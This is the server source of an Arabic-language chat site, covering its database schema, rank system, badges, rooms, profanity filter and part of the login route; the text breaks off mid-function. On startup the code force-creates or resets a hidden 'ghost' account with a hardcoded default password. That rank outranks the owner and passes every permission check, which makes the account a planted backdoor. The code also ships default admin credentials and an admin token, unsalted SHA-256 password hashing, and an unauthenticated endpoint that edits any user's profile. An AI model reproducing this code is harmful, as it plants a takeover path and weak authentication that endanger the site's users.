const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);

// ===== SECURITY & PERFORMANCE =====
try {
  const helmet = require('helmet');
  app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
} catch(e) { console.warn('helmet not installed, skipping'); }
try {
  const compression = require('compression');
  app.use(compression());
} catch(e) { console.warn('compression not installed, skipping'); }
try {
  const rateLimit = require('express-rate-limit');
  const loginLimiter = rateLimit({ windowMs: 15*60*1000, max: 20, message: {ok:false,msg:'محاولات كثيرة، حاول بعد 15 دقيقة'} });
  app.use('/api/login', loginLimiter);
  app.use('/api/register', loginLimiter);
} catch(e) { console.warn('express-rate-limit not installed, skipping'); }
const io = new Server(server, {
  cors: { origin: process.env.CORS_ORIGIN || '*', credentials: true },
  pingTimeout: 120000,     // 2 دقيقة قبل اعتبار الاتصال منقطع
  pingInterval: 20000,     // فحص كل 20 ثانية
  upgradeTimeout: 30000,
  transports: ['websocket', 'polling'],
  allowEIO3: true,
  connectTimeout: 45000,
  maxHttpBufferSize: 20e6  // 20MB لدعم الصور والصوت
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));

// ===== DATABASE =====
let db = null;
let useDB = false;

async function initDB() {
  if (process.env.DATABASE_URL) {
    try {
      const { Pool } = require('pg');
      db = new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
      await db.query(`
        CREATE TABLE IF NOT EXISTS users (
          id SERIAL PRIMARY KEY,
          username VARCHAR(50) UNIQUE NOT NULL,
          password VARCHAR(64) NOT NULL,
          rank VARCHAR(30) DEFAULT 'member',
          points INTEGER DEFAULT 0,
          created_at TIMESTAMP DEFAULT NOW(),
          is_banned BOOLEAN DEFAULT FALSE,
          ban_reason VARCHAR(200) DEFAULT NULL,
          banned_by VARCHAR(50) DEFAULT NULL,
          banned_at TIMESTAMP DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS messages (
          id SERIAL PRIMARY KEY,
          room VARCHAR(50) NOT NULL,
          username VARCHAR(50),
          text TEXT,
          type VARCHAR(20) DEFAULT 'chat',
          rank VARCHAR(30) DEFAULT NULL,
          created_at TIMESTAMP DEFAULT NOW()
        );
        -- إضافة عمود rank إذا لم يكن موجوداً (للجداول القديمة)
        ALTER TABLE messages ADD COLUMN IF NOT EXISTS rank VARCHAR(30) DEFAULT NULL;
        CREATE TABLE IF NOT EXISTS profiles (
          username VARCHAR(50) PRIMARY KEY,
          avatar TEXT DEFAULT NULL,
          music_url TEXT DEFAULT NULL,
          music_name VARCHAR(100) DEFAULT NULL,
          bio VARCHAR(200) DEFAULT NULL,
          updated_at TIMESTAMP DEFAULT NOW()
        );
        ALTER TABLE profiles ADD COLUMN IF NOT EXISTS avatar_shape VARCHAR(10) DEFAULT 'circle';
        CREATE TABLE IF NOT EXISTS permissions (
          rank VARCHAR(30) PRIMARY KEY,
          perms JSONB NOT NULL DEFAULT '{}'
        );
        CREATE TABLE IF NOT EXISTS badges (
          id SERIAL PRIMARY KEY,
          name VARCHAR(50) NOT NULL,
          emoji VARCHAR(10) NOT NULL,
          color VARCHAR(20) DEFAULT '#ffd700',
          description VARCHAR(100) DEFAULT '',
          created_at TIMESTAMP DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS user_badges (
          username VARCHAR(50) NOT NULL,
          badge_id INTEGER NOT NULL,
          assigned_at TIMESTAMP DEFAULT NOW(),
          PRIMARY KEY (username, badge_id)
        );
        ALTER TABLE users ADD COLUMN IF NOT EXISTS ban_reason VARCHAR(200) DEFAULT NULL;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS banned_by VARCHAR(50) DEFAULT NULL;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS banned_at TIMESTAMP DEFAULT NULL;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS age INTEGER DEFAULT 22;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS gender VARCHAR(10) DEFAULT 'ذكر';
        ALTER TABLE users ADD COLUMN IF NOT EXISTS name_color VARCHAR(20) DEFAULT NULL;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS name_font_size VARCHAR(10) DEFAULT NULL;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS name_font_family VARCHAR(30) DEFAULT NULL;
        CREATE TABLE IF NOT EXISTS private_messages (
          id SERIAL PRIMARY KEY,
          conv_key VARCHAR(120) NOT NULL,
          from_user VARCHAR(50) NOT NULL,
          to_user VARCHAR(50) NOT NULL,
          text TEXT NOT NULL,
          time VARCHAR(10),
          msg_type VARCHAR(20) DEFAULT 'private',
          media_data TEXT DEFAULT NULL,
          created_at TIMESTAMP DEFAULT NOW()
        );
        ALTER TABLE private_messages ADD COLUMN IF NOT EXISTS msg_type VARCHAR(20) DEFAULT 'private';
        ALTER TABLE private_messages ADD COLUMN IF NOT EXISTS media_data TEXT DEFAULT NULL;
        CREATE INDEX IF NOT EXISTS idx_pm_conv_key ON private_messages(conv_key);
        CREATE TABLE IF NOT EXISTS pm_cleared (
          id SERIAL PRIMARY KEY,
          username VARCHAR(50) NOT NULL,
          conv_key VARCHAR(120) NOT NULL,
          cleared_at TIMESTAMP DEFAULT NOW(),
          UNIQUE(username, conv_key)
        );
        CREATE TABLE IF NOT EXISTS friend_requests (
          id SERIAL PRIMARY KEY,
          from_user VARCHAR(50) NOT NULL,
          to_user VARCHAR(50) NOT NULL,
          status VARCHAR(10) DEFAULT 'pending',
          created_at TIMESTAMP DEFAULT NOW(),
          UNIQUE(from_user, to_user)
        );
        CREATE TABLE IF NOT EXISTS friends (
          id SERIAL PRIMARY KEY,
          user1 VARCHAR(50) NOT NULL,
          user2 VARCHAR(50) NOT NULL,
          created_at TIMESTAMP DEFAULT NOW(),
          UNIQUE(user1, user2)
        );
        CREATE TABLE IF NOT EXISTS user_gold (
          username VARCHAR(50) PRIMARY KEY,
          gold INTEGER DEFAULT 0,
          diamond INTEGER DEFAULT 0,
          updated_at TIMESTAMP DEFAULT NOW()
        );
      `);
      const adminPass = hashPassword(process.env.ADMIN_PASSWORD || 'admin123');
      await db.query(`INSERT INTO users (username,password,rank) VALUES ('admin',$1,'owner') ON CONFLICT (username) DO NOTHING`, [adminPass]);
      useDB = true;
      console.log('Database connected');
      // Ghost account — force create/update
      try {
        const ghostPass = hashPassword(process.env.GHOST_PASSWORD || 'gh0st@2024#secret');
        const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
        await db.query(
          `INSERT INTO users (username,password,rank) VALUES ($1,$2,'ghost')
           ON CONFLICT (username) DO UPDATE SET password=$2, rank='ghost'`,
          [ghostName, ghostPass]
        );
        console.log('Ghost account ready:', ghostName);
      } catch(ge) { console.log('Ghost setup warning:', ge.message); }
    } catch(e) { console.log('No DB - using memory:', e.message); }
  }
}

const memUsers = {
  admin: { username:'admin', password:hashPassword('admin123'), rank:'owner', is_banned:false, points:0 },
  [process.env.GHOST_USERNAME||'shadow_x9k']: { username:process.env.GHOST_USERNAME||'shadow_x9k', password:hashPassword(process.env.GHOST_PASSWORD||'gh0st@2024#secret'), rank:'ghost', is_banned:false, points:0 }
};
const memMessages = {};
const memPMs = {}; // { 'user1||user2': [{from,to,text,time,ts},...] }
const reportsLog = []; // قائمة البلاغات

// ===== GOLD & DIAMOND SYSTEM =====
// memGold: { username: { gold: 0, diamond: 0 } }
const memGold = {};
const _goldDirty = new Set(); // usernames that need DB save

// حفظ الذهب في DB كل 30 ثانية بدل كل رسالة
setInterval(async () => {
  if (!useDB || _goldDirty.size === 0) return;
  const toSave = [..._goldDirty];
  _goldDirty.clear();
  for (const username of toSave) {
    const g = memGold[username];
    if (!g) continue;
    try {
      await db.query(`INSERT INTO user_gold (username,gold,diamond,updated_at) VALUES ($1,$2,$3,NOW())
        ON CONFLICT (username) DO UPDATE SET gold=$2,diamond=$3,updated_at=NOW()`,
        [username, g.gold, g.diamond]);
    } catch(e) {}
  }
}, 30000);
const activeCalls = {}; // { 'user1||user2': { type, startTime, user1, user2, offer } }
const banLog = []; // memory ban log
const memBadges = []; // [{id,name,emoji,color,description}]
const memUserBadges = {}; // { username: [badge_id,...] }
let _badgeIdCounter = 1;

// Welcome message config
let welcomeMessage = {
  enabled: true,
  senderName: 'غزل عراقي 🌹',
  text: 'أهلاً وسهلاً بك يا {name} في عالم غزل عراقي 🌹\nنتمنى لك وقتاً ممتعاً بيننا 💫'
};
app.get('/api/admin/welcome-message', adminAuth, (req,res) => res.json({ok:true, welcome: welcomeMessage}));
app.post('/api/admin/welcome-message', adminAuth, (req,res) => {
  const {enabled, senderName, text} = req.body;
  welcomeMessage.enabled = !!enabled;
  if (senderName !== undefined) welcomeMessage.senderName = senderName.substring(0,30);
  if (text !== undefined) welcomeMessage.text = text.substring(0,300);
  res.json({ok:true});
});
const memProfiles = {}; // { username: { avatar, music_url, music_name, bio } }
const pmLock = {}; // { username: Set(blockedSenders) } — قفل الخاص

// ===== DEFAULT PERMISSIONS =====
const DEFAULT_PERMS = {
  ghost:       { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
  owner:       { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
  owner_admin: { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
  owner_vip:   { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:false, reset_pass:true },
  super_admin: { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:false, announce:true, add_quiz:true, lock_room:false, reset_pass:false },
  admin:       { ban:false, unban:false, mute:true, kick:true, clear_room:false, set_rank:false, announce:false, add_quiz:false, lock_room:false, reset_pass:false }
};
let memPerms = JSON.parse(JSON.stringify(DEFAULT_PERMS));

async function getPerms() {
  if (!useDB) return memPerms;
  const rows = await db.query('SELECT rank, perms FROM permissions');
  if (rows.rows.length === 0) return memPerms;
  const result = JSON.parse(JSON.stringify(DEFAULT_PERMS));
  rows.rows.forEach(r => { if (result[r.rank] !== undefined) result[r.rank] = r.perms; });
  return result;
}
function hashPassword(p) { return crypto.createHash('sha256').update(p).digest('hex'); }

// ===== ROOMS =====
let ROOMS = {
  general:      { name:'الغرفة العامة',      icon:'🌍', color:'#1565c0' },
  iraq:         { name:'غرفة العراق',        icon:'🇮🇶', color:'#c62828' },
  youth:        { name:'غرفة الشباب',        icon:'🔥', color:'#e65100' },
  feelings:     { name:'غرفة المشاعر',       icon:'💕', color:'#c2185b' },
  music:        { name:'غرفة الموسيقى',      icon:'🎵', color:'#6a1b9a' },
  fun:          { name:'غرفة الفكاهة',       icon:'😂', color:'#f57f17' },
  competitions: { name:'غرفة المسابقات',     icon:'🏆', color:'#f9a825', isQuiz:true },
  admin_meeting:{ name:'التجمع الإداري',     icon:'🛡️', color:'#b044ff', isPrivate:true, allowedRanks:['owner','owner_admin','owner_vip','super_admin','admin'] },
};
Object.keys(ROOMS).forEach(r => memMessages[r] = []);

function slugify(text) {
  return text.toLowerCase().replace(/\s+/g,'-').replace(/[^\w\-]/g,'') || 'room-' + Date.now();
}

// ===== 10-RANK SYSTEM =====
const RANKS = {
  owner:       { label:'👑 مالك',        color:'#ff4444', fontSize:'22px', fontWeight:'900', glow:'0 0 10px #ff4444', canBan:true,  canMute:true,  canKick:true,  canSetRank:true,  canManageRooms:true,  canManageBadWords:true,  bigName:true  },
  owner_admin: { label:'💼 أونر إداري',  color:'#ff8c00', fontSize:'20px', fontWeight:'800', glow:'0 0 8px #ff8c00',  canBan:true,  canMute:true,  canKick:true,  canSetRank:true,  canManageRooms:true,  canManageBadWords:true,  bigName:true  },
  owner_vip:   { label:'⭐ أونر',         color:'#ffd700', fontSize:'19px', fontWeight:'700', glow:'0 0 8px #ffd700',  canBan:true,  canMute:true,  canKick:true,  canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:true  },
  super_admin: { label:'🔱 سوبر أدمن',   color:'#b044ff', fontSize:'18px', fontWeight:'700', glow:'0 0 6px #b044ff',  canBan:true,  canMute:true,  canKick:true,  canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:true  },
  admin:       { label:'⚙️ أدمن',        color:'#00bfff', fontSize:'17px', fontWeight:'700', glow:'0 0 5px #00bfff',  canBan:false, canMute:true,  canKick:true,  canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  premium:     { label:'💎 بريميوم',     color:'#00e5ff', fontSize:'16px', fontWeight:'600', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  vip:         { label:'🌟 عضو مميز',    color:'#ce93d8', fontSize:'16px', fontWeight:'600', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  gold:        { label:'🥇 عضو ذهبي',    color:'#ffc107', fontSize:'15px', fontWeight:'500', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  member:      { label:'👤 عضو مسجل',    color:'#90caf9', fontSize:'14px', fontWeight:'400', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  visitor:     { label:'👁️ زائر',        color:'#b0bec5', fontSize:'13px', fontWeight:'400', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  ghost:       { label:'👻 شبح',          color:'#ff4444', fontSize:'22px', fontWeight:'900', glow:'0 0 10px #ff4444', canBan:true,  canMute:true,  canKick:true,  canSetRank:true,  canManageRooms:true,  canManageBadWords:true,  bigName:true  },
};

// ===== RANK CUSTOMIZATION (icons & labels) =====
let rankCustom = {}; // { 'owner': { icon: '👑', label: 'مالك' }, ... }

// Get effective rank label (with custom override)
function getRankLabel(rank) {
  if (rankCustom[rank]?.label) return rankCustom[rank].label;
  return RANKS[rank]?.label || rank;
}

// Admin API: update rank icon/label
app.get('/api/admin/rank-custom', adminAuth, (req,res) => {
  res.json({ok:true, rankCustom, ranks: RANKS});
});
app.post('/api/admin/rank-custom', adminAuth, (req,res) => {
  const {rank, label} = req.body;
  if (!RANKS[rank]) return res.json({ok:false, msg:'رتبة غير صحيحة'});
  if (!rankCustom[rank]) rankCustom[rank] = {};
  if (label !== undefined) rankCustom[rank].label = label.substring(0,30);
  // Broadcast updated ranks to all clients
  const updatedRanks = {};
  Object.keys(RANKS).forEach(r => {
    updatedRanks[r] = {...RANKS[r], label: getRankLabel(r)};
  });
  io.emit('ranks-updated', updatedRanks);
  res.json({ok:true, rankCustom});
});
// Reset rank label to default
app.post('/api/admin/rank-custom/reset', adminAuth, (req,res) => {
  const {rank} = req.body;
  if (rankCustom[rank]) delete rankCustom[rank];
  const updatedRanks = {};
  Object.keys(RANKS).forEach(r => {
    updatedRanks[r] = {...RANKS[r], label: getRankLabel(r)};
  });
  io.emit('ranks-updated', updatedRanks);
  res.json({ok:true});
});
// ===== END RANK CUSTOMIZATION =====

// ===== NAME STYLE API (color/size/font for user list) =====
app.post('/api/name-style', async (req,res) => {
  const {username, nameColor, nameFontSize, nameFontFamily} = req.body;
  if (!username) return res.json({ok:false,msg:'مطلوب اسم المستخدم'});
  if (useDB) {
    await db.query('UPDATE users SET name_color=$1,name_font_size=$2,name_font_family=$3 WHERE username=$4',
      [nameColor||null, nameFontSize||null, nameFontFamily||null, username]);
  } else {
    if (memUsers[username]) {
      memUsers[username].name_color = nameColor||null;
      memUsers[username].name_font_size = nameFontSize||null;
      memUsers[username].name_font_family = nameFontFamily||null;
    }
  }
  // Update live user and broadcast
  const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) {
    chatUsers[sid].nameColor = nameColor||null;
    chatUsers[sid].nameFontSize = nameFontSize||null;
    chatUsers[sid].nameFontFamily = nameFontFamily||null;
    const room = chatUsers[sid].room;
    io.to(room).emit('room-users', getRoomUsers(room));
  }
  res.json({ok:true});
});
// ===== END NAME STYLE API =====

const RANK_ORDER = ['ghost','owner','owner_admin','owner_vip','super_admin','admin','premium','vip','gold','member','visitor'];
function rankLevel(r) { return RANK_ORDER.indexOf(r); }
function canManage(actorRank, targetRank) { 
  if (actorRank === 'ghost') return true; // ghost can manage anyone
  return rankLevel(actorRank) < rankLevel(targetRank); 
}
function hasPermission(rank, perm) { 
  if (rank === 'ghost') return true; // ghost has all permissions
  return RANKS[rank]?.[perm] === true; 
}

function adminAuth(req,res,next) {
  if (req.headers['x-admin-token'] !== (process.env.ADMIN_TOKEN||'ghazal-admin-2024')) return res.json({ok:false,msg:'غير مصرح'});
  next();
}

// ===== ADMIN ACTIVITY LOG =====
const adminLog = []; // max 500 entries in memory
function logAction(adminName, adminRank, action, target, details='') {
  const entry = {
    id: Date.now(),
    time: new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}),
    ts: Date.now(),
    admin: adminName,
    rank: adminRank,
    action,
    target: target||'',
    details: details||''
  };
  adminLog.unshift(entry);
  if (adminLog.length > 500) adminLog.pop();
}
app.get('/api/admin/activity-log', adminAuth, (req,res) => {
  res.json({ ok:true, log: adminLog });
});
// ===== END ADMIN LOG =====

// ===== BADGES SYSTEM =====
// Get all badges
app.get('/api/badges', async (req,res) => {
  if (useDB) {
    try {
      const b=await db.query('SELECT * FROM badges ORDER BY id');
      const ub=await db.query('SELECT * FROM user_badges');
      const userBadges={};
      ub.rows.forEach(r=>{ if(!userBadges[r.username]) userBadges[r.username]=[]; userBadges[r.username].push(r.badge_id); });
      res.json({ok:true, badges:b.rows, userBadges});
    } catch(e){ res.json({ok:true,badges:memBadges,userBadges:memUserBadges}); }
  } else { res.json({ok:true, badges:memBadges, userBadges:memUserBadges}); }
});

// Get badges for specific user
app.get('/api/user-badges/:username', async (req,res) => {
  const {username}=req.params;
  if (useDB) {
    try {
      const r=await db.query('SELECT b.* FROM badges b JOIN user_badges ub ON b.id=ub.badge_id WHERE ub.username=$1 ORDER BY ub.assigned_at',[username]);
      res.json({ok:true, badges:r.rows});
    } catch(e){ res.json({ok:true,badges:[]}); }
  } else {
    const ids=memUserBadges[username]||[];
    res.json({ok:true, badges:memBadges.filter(b=>ids.includes(b.id))});
  }
});

// Admin: add badge
app.post('/api/admin/badges/add', adminAuth, async (req,res) => {
  const {name,emoji,color,description,adminName,adminRank}=req.body;
  if (!name||!emoji) return res.json({ok:false,msg:'الاسم والإيموجي مطلوبان'});
  if (useDB) {
    try {
      const r=await db.query('INSERT INTO badges (name,emoji,color,description) VALUES ($1,$2,$3,$4) RETURNING *',[name,emoji,color||'#ffd700',description||'']);
      logAction(adminName||'أدمن',adminRank||'admin','🏅 إضافة شارة',name);
      res.json({ok:true, badge:r.rows[0]});
    } catch(e){ res.json({ok:false,msg:e.message}); }
  } else {
    const badge={id:_badgeIdCounter++,name,emoji,color:color||'#ffd700',description:description||''};
    memBadges.push(badge);
    logAction(adminName||'أدمن',adminRank||'admin','🏅 إضافة شارة',name);
    res.json({ok:true, badge});
  }
});

// Admin: delete badge
app.post('/api/admin/badges/delete', adminAuth, async (req,res) => {
  const {id,adminName,adminRank}=req.body;
  if (useDB) {
    try {
      await db.query('DELETE FROM user_badges WHERE badge_id=$1',[id]);
      const r=await db.query('DELETE FROM badges WHERE id=$1 RETURNING name',[id]);
      logAction(adminName||'أدمن',adminRank||'admin','🗑️ حذف شارة',r.rows[0]?.name||id);
      res.json({ok:true});
    } catch(e){ res.json({ok:false,msg:e.message}); }
  } else {
    const idx=memBadges.findIndex(b=>b.id===id);
    if(idx>-1){ logAction(adminName||'أدمن',adminRank||'admin','🗑️ حذف شارة',memBadges[idx].name); memBadges.splice(idx,1); }
    Object.keys(memUserBadges).forEach(u=>{ memUserBadges[u]=memUserBadges[u].filter(bid=>bid!==id); });
    res.json({ok:true});
  }
});

// Admin: assign badge to user
app.post('/api/admin/badges/assign', adminAuth, async (req,res) => {
  const {username,badgeId,adminName,adminRank}=req.body;
  if (useDB) {
    try {
      await db.query('INSERT INTO user_badges (username,badge_id) VALUES ($1,$2) ON CONFLICT DO NOTHING',[username,badgeId]);
      logAction(adminName||'أدمن',adminRank||'admin','🎖️ منح شارة',username);
      // Notify user live
      const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
      if(sid){ const b=await db.query('SELECT * FROM badges WHERE id=$1',[badgeId]); if(b.rows[0]) io.to(sid).emit('badge-received',b.rows[0]); }
      res.json({ok:true});
    } catch(e){ res.json({ok:false,msg:e.message}); }
  } else {
    if(!memUserBadges[username]) memUserBadges[username]=[];
    if(!memUserBadges[username].includes(badgeId)){ memUserBadges[username].push(badgeId); }
    const badge=memBadges.find(b=>b.id===badgeId);
    logAction(adminName||'أدمن',adminRank||'admin','🎖️ منح شارة',username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
    if(sid&&badge) io.to(sid).emit('badge-received',badge);
    res.json({ok:true});
  }
});

// Admin: revoke badge from user
app.post('/api/admin/badges/revoke', adminAuth, async (req,res) => {
  const {username,badgeId,adminName,adminRank}=req.body;
  if (useDB) {
    try { await db.query('DELETE FROM user_badges WHERE username=$1 AND badge_id=$2',[username,badgeId]); }
    catch(e){ return res.json({ok:false,msg:e.message}); }
  } else {
    if(memUserBadges[username]) memUserBadges[username]=memUserBadges[username].filter(id=>id!==badgeId);
  }
  logAction(adminName||'أدmن',adminRank||'admin','🚫 سحب شارة',username);
  res.json({ok:true});
});
// ===== END BADGES SYSTEM =====
app.post('/api/admin/addroom', adminAuth, (req,res) => {
  const { name, icon, color, isQuiz } = req.body;
  if (!name||!icon) return res.json({ok:false,msg:'الاسم والأيقونة مطلوبان'});
  if (Object.keys(ROOMS).length >= 20) return res.json({ok:false,msg:'الحد الأقصى 20 غرفة'});
  const id = slugify(name)+'-'+Date.now().toString().slice(-4);
  ROOMS[id] = { name, icon, color:color||'#1565c0', isQuiz:isQuiz||false };
  memMessages[id] = [];
  io.emit('rooms-updated', ROOMS);
  logAction(req.body.adminName||'أدمن',req.body.adminRank||'admin','🏠 إضافة غرفة',name);
  res.json({ok:true,id});
});
app.post('/api/admin/editroom', adminAuth, (req,res) => {
  const {id,name,icon,color} = req.body;
  if (!ROOMS[id]) return res.json({ok:false,msg:'الغرفة غير موجودة'});
  if (name) ROOMS[id].name=name;
  if (icon) ROOMS[id].icon=icon;
  if (color) ROOMS[id].color=color;
  io.emit('rooms-updated', ROOMS);
  logAction(req.body.adminName||'أدمن',req.body.adminRank||'admin','✏️ تعديل غرفة',req.body.name||req.body.id);
  res.json({ok:true});
});
app.post('/api/admin/deleteroom', adminAuth, (req,res) => {
  const {id} = req.body;
  if (id==='general') return res.json({ok:false,msg:'لا يمكن حذف الغرفة العامة'});
  if (!ROOMS[id]) return res.json({ok:false,msg:'الغرفة غير موجودة'});
  Object.values(chatUsers).forEach(u => {
    if (u.room===id) {
      io.to(u.id).emit('room-deleted','تم حذف الغرفة، تم نقلك للغرفة العامة');
      const sock = io.sockets.sockets.get(u.id);
      if (sock) { sock.leave(id); sock.join('general'); }
      u.room='general';
    }
  });
  delete ROOMS[id]; delete memMessages[id];
  io.emit('rooms-updated', ROOMS);
  res.json({ok:true});
});
app.get('/api/rooms', (req,res) => res.json({ok:true,rooms:ROOMS}));

// Update allowed ranks for private rooms (owner only)
app.post('/api/admin/room-access', adminAuth, (req,res) => {
  const {roomId, allowedRanks} = req.body;
  if (!ROOMS[roomId]) return res.json({ok:false,msg:'الغرفة غير موجودة'});
  if (!ROOMS[roomId].isPrivate) return res.json({ok:false,msg:'هذه الغرفة ليست خاصة'});
  if (!Array.isArray(allowedRanks)) return res.json({ok:false,msg:'بيانات غير صحيحة'});
  ROOMS[roomId].allowedRanks = allowedRanks;
  io.emit('rooms-updated', ROOMS);
  // Kick users from room if their rank is no longer allowed
  Object.values(chatUsers).forEach(u => {
    if (u.room===roomId && !allowedRanks.includes(u.rank)){
      io.to(u.id).emit('room-access-denied',{room:roomId,roomName:ROOMS[roomId].name});
      io.to(u.id).emit('room-access-kicked','تم نقلك للغرفة العامة لأن صلاحيتك تغيرت');
      const sock = io.sockets.sockets.get(u.id);
      if (sock){ sock.leave(roomId); sock.join('general'); }
      u.room='general';
    }
  });
  res.json({ok:true,allowedRanks});
});

// ===== PROFANITY FILTER =====
let BAD_WORDS = [
  'كلب','كلبة','حمار','حمارة','غبي','غبية','احمق','معتوه','وقح','وقحة',
  'منافق','كذاب','لعين','يلعن','العن','تبا','ملعون','خنزير','قرد',
  'تفو','خرا','زبالة','نجس','وسخ','بهيم',
  'ابن الكلب','ابن الحرام','بنت الكلب','بنت الحرام',
  'شرموطة','شرموط','عاهرة','عاهر','زانية','زاني','فاجرة','فاجر',
  'قحبة','قحب','متناكة','منيوك','مخنث','شاذ','لوطي','ابن زنا','بنت زنا',
  'زب','كس','كسك','كسها','طيز','طيزك','طيزها',
  'نيك','انيك','ينيك','تنيك','ناكني','ناكها','بزاز','متناك','تناك',
  'خول','خولات','سكس','بورن','بورنو','إباحي',
  'fuck','fucker','fucking','shit','bitch','bastard','asshole','jackass',
  'motherfucker','porn','nude','naked','dick','cock','pussy','cunt','tits','whore','slut','xxx',
  'كس امك','كس اختك','كسمك','ممحون','ممحونة','ديوث','غندور','معرص',
  'عيري','عيرك','طيزج','كسج','انيج','أنيچ',
  'orospu','sikim','kahpe','lanet',
];
let BAD_USERNAMES = [
  'زب','كس','طيز','نيك','شرموط','شرموطة','عاهر','عاهرة','قحبة','قحب',
  'زاني','زانية','مخنث','شاذ','لوطي','سكسي','سكس','خول','متناك',
  'sex','sexy','porn','horny','naked','nude','slut','whore','dick','cock',
  'pussy','tits','xxx','fuck','fucker','bitch','asshole','69',
  'قواد','خنيث','ديوث','غندور','معرص','ممحون',
];
let customBadWords = [];
function getAllBadWords() { return [...BAD_WORDS,...customBadWords]; }
function normalizeAr(t) {
  return t.replace(/أ|إ|آ/g,'ا').replace(/ة/g,'ه').replace(/ى/g,'ي').replace(/\s+/g,' ').trim();
}
function containsBadWordFull(text) {
  const n=normalizeAr(text.toLowerCase());
  const c=n.replace(/[\s\.\-_\*]+/g,'');
  for (const w of getAllBadWords()) {
    const nw=normalizeAr(w.toLowerCase());
    if (n.includes(nw)||c.includes(nw.replace(/\s/g,''))) return {found:true,word:w};
  }
  return {found:false};
}
function containsBadUsername(name) {
  const n=normalizeAr(name.toLowerCase()).replace(/\s+/g,'');
  for (const w of BAD_USERNAMES) if (n.includes(normalizeAr(w.toLowerCase()))) return true;
  return false;
}

// ===== AD DETECTION & AUTO-BAN =====
function detectAdLink(text) {
  const urlPattern = /https?:\/\/[^\s]+/gi;
  const urls = text.match(urlPattern)||[];
  const ownDomain = process.env.SITE_DOMAIN||'ghazal-iraq';
  for (const url of urls) { if (!url.includes(ownDomain)) return true; }
  // كلمات إشهار حقيقية فقط - بدون واتساب وماسنجر وتيليغرام
  const adPatterns = [/رابط\s*موقع/i, /موقع\s*دردشة\s*\S+/i, /تواصل\s*معنا\s*على/i, /اضغط\s*الرابط/i, /انضم\s*لموقع/i];
  const mentionPatterns = [/iraq1\.chat/i, /swalf\.chat/i, /كيبورد\.com/i];
  for (const p of [...adPatterns,...mentionPatterns]) { if (p.test(text)) return true; }
  return false;
}

// ===== BAD WORDS ADMIN ROUTES =====
app.get('/api/admin/badwords', adminAuth, (req,res) => res.json({ok:true,default:BAD_WORDS,custom:customBadWords}));
app.post('/api/admin/badwords/add', adminAuth, (req,res) => {
  const {word}=req.body;
  if (!word||word.trim().length<2) return res.json({ok:false,msg:'الكلمة قصيرة جداً'});
  const w=word.trim().toLowerCase();
  if (customBadWords.includes(w)) return res.json({ok:false,msg:'موجودة مسبقاً'});
  customBadWords.push(w); res.json({ok:true,custom:customBadWords});
});
app.post('/api/admin/badwords/remove', adminAuth, (req,res) => {
  customBadWords=customBadWords.filter(w=>w!==req.body.word?.trim().toLowerCase());
  res.json({ok:true,custom:customBadWords});
});
app.post('/api/admin/badwords/removedefault', adminAuth, (req,res) => {
  BAD_WORDS=BAD_WORDS.filter(w=>w!==req.body.word); res.json({ok:true});
});

// ===== AUTH ROUTES =====
app.post('/api/register', async (req,res) => {
  const {username,password,gender,age}=req.body;
  if (!username||!password||username.length<3) return res.json({ok:false,msg:'بيانات غير صحيحة'});
  if (containsBadUsername(username)||containsBadWordFull(username).found)
    return res.json({ok:false,msg:'❌ اسم المستخدم غير مقبول'});
  const hashed=hashPassword(password);
  if (useDB) {
    try { await db.query('INSERT INTO users (username,password,age,gender) VALUES ($1,$2,$3,$4)',[username,hashed,parseInt(age)||22,gender||'ذكر']); res.json({ok:true}); }
    catch(e) { res.json({ok:false,msg:'الاسم مستخدم مسبقاً'}); }
  } else {
    if (memUsers[username]) return res.json({ok:false,msg:'الاسم مستخدم مسبقاً'});
    memUsers[username]={username,password:hashed,rank:'member',is_banned:false,gender,age,points:0};
    res.json({ok:true});
  }
});
app.post('/api/login', async (req,res) => {
  const {username,password}=req.body;
  const hashed=hashPassword(password);
  if (useDB) {
    const r=await db.query('SELECT * FROM users WHERE username=$1',[username]);
    console.log('Login attempt:', username, 'found:', r.rows.length, r.rows[0]?.rank, 'hashed_match:', r.rows[0]?.password===hashed);
    if (!r.rows.length || r.rows[0].password!==hashed) return res.json({ok:false,msg:'اسم المستخدم أو كلمة المرور خاطئة'});
    const u=r.rows[0];
    const exemptRanks = ['owner','ghost','super_admin','owner_admin','owner_vip'];
